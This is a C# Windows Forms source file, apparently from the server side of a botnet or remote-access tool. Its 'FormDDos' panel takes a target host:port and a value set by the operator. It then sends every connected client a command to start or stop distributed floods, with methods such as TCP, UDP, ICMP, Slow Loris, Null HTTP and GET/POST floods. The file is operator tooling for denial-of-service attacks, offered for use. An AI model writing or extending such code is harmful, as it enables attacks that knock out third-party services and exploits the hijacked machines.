using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Threading.Tasks;
using System.Windows.Forms;
using CustomControls.RJControls;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormDDos : FormMaterial
{
	public bool work;

	public List<Clients> clients = new List<Clients>();

	private IContainer components;

	private Timer timer1;

	private Panel panel1;

	private RJButton rjButton1;

	public MaterialSwitch materialSwitch7;

	public RJTextBox rjTextBox1;

	public Panel panel2;

	private CheckBox checkBox2;

	private CheckBox checkBox1;

	private CheckBox checkBox3;

	private CheckBox checkBox8;

	private CheckBox checkBox7;

	private CheckBox checkBox6;

	private CheckBox checkBox5;

	private CheckBox checkBox9;

	private CheckBox checkBox10;

	private CheckBox checkBox11;

	private Label label3;

	private Label label2;

	private Label label1;

	public NumericUpDown numericUpDown2;

	private CheckBox checkBox12;

	private CheckBox checkBox13;

	private CheckBox checkBox14;

	public FormDDos()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void FormProcess_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		timer1.Start();
	}

	private void Closing1(object sender, FormClosingEventArgs e)
	{
		work = false;
		Clients[] array = clients.ToArray();
		foreach (Clients client in array)
		{
			Task.Run(delegate
			{
				client.Disconnect();
			});
		}
		Hide();
		e.Cancel = true;
		materialSwitch7.Checked = false;
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		Text = $"DDos           Online [{clients.Count}]";
	}

	private void ChangeScheme(object sender)
	{
		rjTextBox1.BorderColor = FormMaterial.PrimaryColor;
		rjButton1.BorderColor = FormMaterial.PrimaryColor;
		rjButton1.ForeColor = FormMaterial.PrimaryColor;
		numericUpDown2.ForeColor = FormMaterial.PrimaryColor;
	}

	private void materialSwitch7_CheckedChanged(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(rjTextBox1.Texts))
		{
			if (materialSwitch7.Checked)
			{
				materialSwitch7.Checked = false;
				MessageBox.Show("Please enter host:port");
			}
		}
		else if (!rjTextBox1.Texts.Contains(":"))
		{
			if (materialSwitch7.Checked)
			{
				materialSwitch7.Checked = false;
				MessageBox.Show("Format must be host:port");
			}
		}
		else if (materialSwitch7.Checked)
		{
			List<object> list = new List<object>
			{
				"Start",
				rjTextBox1.Texts,
				(int)numericUpDown2.Value
			};
			bool anyChecked = false;
			foreach (Control control in panel2.Controls)
			{
				if (control is CheckBox)
				{
					CheckBox checkBox = (CheckBox)control;
					if (checkBox.Checked)
					{
						list.Add(checkBox.Text.Replace(" ", ""));
						anyChecked = true;
					}
				}
			}
			if (!anyChecked)
			{
				materialSwitch7.Checked = false;
				MessageBox.Show("Please select at least one method");
				return;
			}
			Clients[] array = clients.ToArray();
			for (int i = 0; i < array.Length; i++)
			{
				array[i].Send(list.ToArray());
			}
		}
		else
		{
			Clients[] array = clients.ToArray();
			for (int j = 0; j < array.Length; j++)
			{
				array[j].Send(new object[1] { "Stop" });
			}
		}
	}

	private void rjButton1_Click(object sender, EventArgs e)
	{
		Hide();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.panel1 = new System.Windows.Forms.Panel();
		this.panel2 = new System.Windows.Forms.Panel();
		this.checkBox14 = new System.Windows.Forms.CheckBox();
		this.checkBox13 = new System.Windows.Forms.CheckBox();
		this.checkBox12 = new System.Windows.Forms.CheckBox();
		this.numericUpDown2 = new System.Windows.Forms.NumericUpDown();
		this.label3 = new System.Windows.Forms.Label();
		this.label2 = new System.Windows.Forms.Label();
		this.label1 = new System.Windows.Forms.Label();
		this.checkBox11 = new System.Windows.Forms.CheckBox();
		this.checkBox10 = new System.Windows.Forms.CheckBox();
		this.checkBox9 = new System.Windows.Forms.CheckBox();
		this.checkBox8 = new System.Windows.Forms.CheckBox();
		this.checkBox7 = new System.Windows.Forms.CheckBox();
		this.checkBox6 = new System.Windows.Forms.CheckBox();
		this.checkBox5 = new System.Windows.Forms.CheckBox();
		this.checkBox3 = new System.Windows.Forms.CheckBox();
		this.checkBox1 = new System.Windows.Forms.CheckBox();
		this.checkBox2 = new System.Windows.Forms.CheckBox();
		this.rjButton1 = new CustomControls.RJControls.RJButton();
		this.materialSwitch7 = new MaterialSkin.Controls.MaterialSwitch();
		this.rjTextBox1 = new CustomControls.RJControls.RJTextBox();
		this.panel1.SuspendLayout();
		this.panel2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.numericUpDown2).BeginInit();
		base.SuspendLayout();
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.panel1.Controls.Add(this.panel2);
		this.panel1.Controls.Add(this.rjButton1);
		this.panel1.Controls.Add(this.materialSwitch7);
		this.panel1.Controls.Add(this.rjTextBox1);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panel1.Location = new System.Drawing.Point(3, 64);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(459, 255);
		this.panel1.TabIndex = 0;
		this.panel2.Controls.Add(this.checkBox14);
		this.panel2.Controls.Add(this.checkBox13);
		this.panel2.Controls.Add(this.checkBox12);
		this.panel2.Controls.Add(this.numericUpDown2);
		this.panel2.Controls.Add(this.label3);
		this.panel2.Controls.Add(this.label2);
		this.panel2.Controls.Add(this.label1);
		this.panel2.Controls.Add(this.checkBox11);
		this.panel2.Controls.Add(this.checkBox10);
		this.panel2.Controls.Add(this.checkBox9);
		this.panel2.Controls.Add(this.checkBox8);
		this.panel2.Controls.Add(this.checkBox7);
		this.panel2.Controls.Add(this.checkBox6);
		this.panel2.Controls.Add(this.checkBox5);
		this.panel2.Controls.Add(this.checkBox3);
		this.panel2.Controls.Add(this.checkBox1);
		this.panel2.Controls.Add(this.checkBox2);
		this.panel2.Location = new System.Drawing.Point(14, 50);
		this.panel2.Name = "panel2";
		this.panel2.Size = new System.Drawing.Size(436, 190);
		this.panel2.TabIndex = 14;
		this.checkBox14.AutoSize = true;
		this.checkBox14.Location = new System.Drawing.Point(330, 144);
		this.checkBox14.Name = "checkBox14";
		this.checkBox14.Size = new System.Drawing.Size(72, 17);
		this.checkBox14.TabIndex = 23;
		this.checkBox14.Text = "Get Flood";
		this.checkBox14.UseVisualStyleBackColor = true;
		this.checkBox13.AutoSize = true;
		this.checkBox13.Location = new System.Drawing.Point(330, 121);
		this.checkBox13.Name = "checkBox13";
		this.checkBox13.Size = new System.Drawing.Size(86, 17);
		this.checkBox13.TabIndex = 22;
		this.checkBox13.Text = "Get Scanner";
		this.checkBox13.UseVisualStyleBackColor = true;
		this.checkBox12.AutoSize = true;
		this.checkBox12.Location = new System.Drawing.Point(330, 98);
		this.checkBox12.Name = "checkBox12";
		this.checkBox12.Size = new System.Drawing.Size(90, 17);
		this.checkBox12.TabIndex = 21;
		this.checkBox12.Text = "Post Scanner";
		this.checkBox12.UseVisualStyleBackColor = true;
		this.numericUpDown2.BackColor = System.Drawing.Color.White;
		this.numericUpDown2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.numericUpDown2.ForeColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.numericUpDown2.Location = new System.Drawing.Point(14, 151);
		this.numericUpDown2.Margin = new System.Windows.Forms.Padding(2);
		this.numericUpDown2.Name = "numericUpDown2";
		this.numericUpDown2.Size = new System.Drawing.Size(42, 20);
		this.numericUpDown2.TabIndex = 20;
		this.numericUpDown2.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.numericUpDown2.UpDownAlign = System.Windows.Forms.LeftRightAlignment.Left;
		this.numericUpDown2.Value = new decimal(new int[4] { 5, 0, 0, 0 });
		this.label3.AutoSize = true;
		this.label3.Location = new System.Drawing.Point(341, 10);
		this.label3.Name = "label3";
		this.label3.Size = new System.Drawing.Size(42, 13);
		this.label3.TabIndex = 16;
		this.label3.Text = "Layer 7";
		this.label2.AutoSize = true;
		this.label2.Location = new System.Drawing.Point(22, 10);
		this.label2.Name = "label2";
		this.label2.Size = new System.Drawing.Size(42, 13);
		this.label2.TabIndex = 15;
		this.label2.Text = "Layer 4";
		this.label1.AutoSize = true;
		this.label1.Location = new System.Drawing.Point(188, 10);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(42, 13);
		this.label1.TabIndex = 14;
		this.label1.Text = "Layer 3";
		this.checkBox11.AutoSize = true;
		this.checkBox11.Location = new System.Drawing.Point(14, 118);
		this.checkBox11.Name = "checkBox11";
		this.checkBox11.Size = new System.Drawing.Size(75, 17);
		this.checkBox11.TabIndex = 13;
		this.checkBox11.Text = "Udp Flood";
		this.checkBox11.UseVisualStyleBackColor = true;
		this.checkBox10.AutoSize = true;
		this.checkBox10.Location = new System.Drawing.Point(14, 96);
		this.checkBox10.Name = "checkBox10";
		this.checkBox10.Size = new System.Drawing.Size(78, 17);
		this.checkBox10.TabIndex = 12;
		this.checkBox10.Text = "Icmp Flood";
		this.checkBox10.UseVisualStyleBackColor = true;
		this.checkBox9.AutoSize = true;
		this.checkBox9.Location = new System.Drawing.Point(330, 75);
		this.checkBox9.Name = "checkBox9";
		this.checkBox9.Size = new System.Drawing.Size(103, 17);
		this.checkBox9.TabIndex = 11;
		this.checkBox9.Text = "Slow Loris Flood";
		this.checkBox9.UseVisualStyleBackColor = true;
		this.checkBox8.AutoSize = true;
		this.checkBox8.Location = new System.Drawing.Point(330, 52);
		this.checkBox8.Name = "checkBox8";
		this.checkBox8.Size = new System.Drawing.Size(73, 17);
		this.checkBox8.TabIndex = 10;
		this.checkBox8.Text = "Pps Flood";
		this.checkBox8.UseVisualStyleBackColor = true;
		this.checkBox7.AutoSize = true;
		this.checkBox7.Location = new System.Drawing.Point(330, 29);
		this.checkBox7.Name = "checkBox7";
		this.checkBox7.Size = new System.Drawing.Size(67, 17);
		this.checkBox7.TabIndex = 9;
		this.checkBox7.Text = "Null Http";
		this.checkBox7.UseVisualStyleBackColor = true;
		this.checkBox6.AutoSize = true;
		this.checkBox6.Location = new System.Drawing.Point(181, 52);
		this.checkBox6.Name = "checkBox6";
		this.checkBox6.Size = new System.Drawing.Size(77, 17);
		this.checkBox6.TabIndex = 8;
		this.checkBox6.Text = "IPv6 Flood";
		this.checkBox6.UseVisualStyleBackColor = true;
		this.checkBox5.AutoSize = true;
		this.checkBox5.Location = new System.Drawing.Point(181, 29);
		this.checkBox5.Name = "checkBox5";
		this.checkBox5.Size = new System.Drawing.Size(77, 17);
		this.checkBox5.TabIndex = 7;
		this.checkBox5.Text = "IPv4 Flood";
		this.checkBox5.UseVisualStyleBackColor = true;
		this.checkBox3.AutoSize = true;
		this.checkBox3.Location = new System.Drawing.Point(14, 72);
		this.checkBox3.Name = "checkBox3";
		this.checkBox3.Size = new System.Drawing.Size(117, 17);
		this.checkBox3.TabIndex = 5;
		this.checkBox3.Text = "Tcp Connect Flood";
		this.checkBox3.UseVisualStyleBackColor = true;
		this.checkBox1.AutoSize = true;
		this.checkBox1.Location = new System.Drawing.Point(14, 49);
		this.checkBox1.Name = "checkBox1";
		this.checkBox1.Size = new System.Drawing.Size(142, 17);
		this.checkBox1.TabIndex = 4;
		this.checkBox1.Text = "Tcp Connect Wait Flood";
		this.checkBox1.UseVisualStyleBackColor = true;
		this.checkBox2.AutoSize = true;
		this.checkBox2.Location = new System.Drawing.Point(14, 26);
		this.checkBox2.Name = "checkBox2";
		this.checkBox2.Size = new System.Drawing.Size(74, 17);
		this.checkBox2.TabIndex = 3;
		this.checkBox2.Text = "Tcp Flood";
		this.checkBox2.UseVisualStyleBackColor = true;
		this.rjButton1.BackColor = System.Drawing.Color.White;
		this.rjButton1.BackgroundColor = System.Drawing.Color.White;
		this.rjButton1.BorderColor = System.Drawing.Color.MediumSlateBlue;
		this.rjButton1.BorderRadius = 0;
		this.rjButton1.BorderSize = 1;
		this.rjButton1.FlatAppearance.BorderSize = 0;
		this.rjButton1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton1.ForeColor = System.Drawing.Color.MediumSlateBlue;
		this.rjButton1.Location = new System.Drawing.Point(263, 16);
		this.rjButton1.Name = "rjButton1";
		this.rjButton1.Size = new System.Drawing.Size(92, 28);
		this.rjButton1.TabIndex = 13;
		this.rjButton1.Text = "Hide";
		this.rjButton1.TextColor = System.Drawing.Color.MediumSlateBlue;
		this.rjButton1.UseVisualStyleBackColor = false;
		this.rjButton1.Click += new System.EventHandler(rjButton1_Click);
		this.materialSwitch7.AutoSize = true;
		this.materialSwitch7.Depth = 0;
		this.materialSwitch7.Location = new System.Drawing.Point(358, 13);
		this.materialSwitch7.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch7.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch7.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch7.Name = "materialSwitch7";
		this.materialSwitch7.Ripple = true;
		this.materialSwitch7.Size = new System.Drawing.Size(92, 37);
		this.materialSwitch7.TabIndex = 12;
		this.materialSwitch7.Text = "Start";
		this.materialSwitch7.UseVisualStyleBackColor = true;
		this.materialSwitch7.CheckedChanged += new System.EventHandler(materialSwitch7_CheckedChanged);
		this.rjTextBox1.BackColor = System.Drawing.Color.White;
		this.rjTextBox1.BorderColor = System.Drawing.Color.MediumSlateBlue;
		this.rjTextBox1.BorderFocusColor = System.Drawing.Color.Yellow;
		this.rjTextBox1.BorderRadius = 0;
		this.rjTextBox1.BorderSize = 1;
		this.rjTextBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox1.ForeColor = System.Drawing.Color.MediumSlateBlue;
		this.rjTextBox1.Location = new System.Drawing.Point(14, 16);
		this.rjTextBox1.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox1.Multiline = false;
		this.rjTextBox1.Name = "rjTextBox1";
		this.rjTextBox1.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox1.PasswordChar = false;
		this.rjTextBox1.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox1.PlaceholderText = "Host";
		this.rjTextBox1.Size = new System.Drawing.Size(242, 28);
		this.rjTextBox1.TabIndex = 11;
		this.rjTextBox1.Texts = "";
		this.rjTextBox1.UnderlinedStyle = false;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(465, 322);
		base.Controls.Add(this.panel1);
		base.Name = "FormDDos";
		this.Text = "DDos           Online [0]";
		base.Load += new System.EventHandler(FormProcess_Load);
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		this.panel2.ResumeLayout(false);
		this.panel2.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.numericUpDown2).EndInit();
		base.ResumeLayout(false);
	}
}
